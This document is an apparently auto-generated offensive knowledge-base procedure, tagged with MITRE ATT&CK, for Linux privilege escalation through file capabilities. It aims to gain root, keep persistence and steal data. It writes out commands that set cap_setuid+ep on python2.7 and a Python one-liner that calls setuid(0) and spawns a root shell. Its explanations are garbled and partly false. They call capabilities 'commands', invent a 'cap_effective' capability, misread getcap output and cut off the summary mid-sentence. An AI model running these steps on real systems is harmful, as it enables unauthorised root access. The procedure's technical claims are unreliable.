---
id: 6b48dbb2-3cb8-47aa-8d53-25d107f3a422
name: Linux - Privilege Escalation via Capabilities
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:18.928420+00:00'
updated_at: '2023-04-10T20:34:20.917095+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Access Token Manipulation|T1134 - Access Token Manipulation]]'
- '[[Bypass User Account Control|T1088 - Bypass User Account Control]]'
tags:
- '[[Capabilities]]'
- '[[Interesting capabilities]]'
- '[[Linux - Privilege Escalation]]'
commands:
- '[[Check for cap_setuid and cap_setuid+ep]]'
- '[[Check openssl capabilities]]'
- '[[Escalate privileges and spawn shell]]'
- '[[Read File with Elevated Privileges]]'
- '[[Set Effective User ID]]'
- '[[Set Python2.7 setuid capability]]'
---

# Linux - Privilege Escalation via Capabilities

## Summary

Linux capabilities are a powerful way to grant specific privileges to a process without giving it full root access. By default, processes run with a restricted set of capabilities, but some binaries may have interesting capabilities that can be exploited for privilege escalation. In this procedure,

## Description

# Description

Linux capabilities are a powerful way to grant specific privileges to a process without giving it full root access. By default, processes run with a restricted set of capabilities, but some binaries may have interesting capabilities that can be exploited for privilege escalation. In this procedure, we will explore how to check for interesting capabilities and how to use them to escalate privileges. The technical explanation involves inspecting the capabilities of a binary and using the cap_setuid+ep capability to gain root privileges. The business value of this procedure is that it allows an attacker to gain full control of the compromised system, steal sensitive data, or use it as a foothold for further attacks.

 

## Requirements

1. Access to a Linux system

1. Ability to execute commands with user-level privileges

 

## Defense

1. Regularly review and audit the capabilities of all binaries on the system

1. Restrict the use of cap_setuid+ep capability to only trusted binaries and users

1. Implement least privilege principles to limit the impact of privilege escalation attacks

 

## Objectives

1. Identify binaries with interesting capabilities

1. Escalate privileges to gain root access

1. Maintain persistence on the compromised system

 

# Instructions

1. To check the capabilities of the OpenSSL binary, run the following command:

 



**Code**: [[$ getcap openssl /usr/bin/openssl 
openssl=ep]]



> The `getcap` command is used to display the capabilities of a binary file. In this case, we are checking the capabilities of the OpenSSL binary located at `/usr/bin/openssl`. The output `openssl=ep` indicates that the binary has all the capabilities, as `ep` stands for `effective capabilities`. This means that the binary can perform any action that is allowed by the capabilities of the user running the binary.



**Command** ([[Check openssl capabilities]]):

```bash
$ getcap openssl /usr/bin/openssl 
openssl=ep
```



2. To use these commands, open a terminal and enter the command followed by the necessary arguments.

 



**Code**: [[cap_dac_read_search # This command allows the user]]



> The `cap_dac_read_search` command allows the user to bypass file permissions and read any file on the system. The `cap_setuid+ep` command sets the effective user ID of the current process to the file owner's user ID, allowing the user to execute files with elevated privileges. These commands should be used with caution as they can potentially give the user access to sensitive system files and data.



**Command** ([[Read File with Elevated Privileges]]):

```bash
cap_dac_read_search
```





**Command** ([[Set Effective User ID]]):

```bash
cap_setuid+ep
```



3. The cap_setuid+ep command is used to escalate privileges by setting the UID to 0 (root) and granting the process all capabilities. This can be used to bypass access controls and execute commands with elevated privileges.

 



**Code**: [[cap_setuid+ep]]



> The argument 'cap_setuid+ep' is a combination of two capabilities: cap_setuid and cap_effective. The cap_setuid capability allows the process to set the UID to any value, including root. The cap_effective capability allows the process to use any capability in its permitted set as if it were in its effective set. By combining these two capabilities, the process gains root privileges and can perform any action on the system.



**Command** ([[Check for cap_setuid and cap_setuid+ep]]):

```bash
getcap /usr/bin/python3
```



4. To gain root access, run the following commands:
1. sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
2. python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'


 



**Code**: [[$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/pyth]]



> The first command sets the capability of the Python2.7 binary to allow it to run with elevated privileges. The second command imports the os module, sets the user ID to 0 (root), and executes a shell (/bin/sh) with elevated privileges. The 'id' command is then run to confirm that the user ID has been changed to root.



**Command** ([[Set Python2.7 setuid capability]]):

```bash
$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
```





**Command** ([[Escalate privileges and spawn shell]]):

```bash
$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Access Token Manipulation|T1134 - Access Token Manipulation]]
- [[Bypass User Account Control|T1088 - Bypass User Account Control]]

## Commands Used

- [[Check for cap_setuid and cap_setuid+ep]]
- [[Check openssl capabilities]]
- [[Escalate privileges and spawn shell]]
- [[Read File with Elevated Privileges]]
- [[Set Effective User ID]]
- [[Set Python2.7 setuid capability]]

## Tags

- [[Capabilities]]
- [[Interesting capabilities]]
- [[Linux - Privilege Escalation]]


